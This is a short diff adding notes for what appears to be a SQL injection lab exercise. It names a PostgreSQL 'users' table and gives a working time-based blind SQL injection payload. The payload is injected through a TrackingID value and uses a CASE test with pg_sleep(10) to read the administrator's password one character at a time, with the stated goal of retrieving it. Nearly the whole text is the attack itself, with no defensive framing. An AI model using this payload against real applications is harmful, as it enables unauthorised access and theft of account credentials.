@@ -1,0 +1,11 @@
+notes :
+    target table : users 
+    columns : username , password 
+    database type :Postgress DB
+
+
+payload 
+    SELECT * from Tracking where TrackingID='test '||(case when  (select SUBSTRING(password,1,1) from users where username='administrator')='1'  then pg_sleep(10) else null end)
+
+goal :
+    retreive password
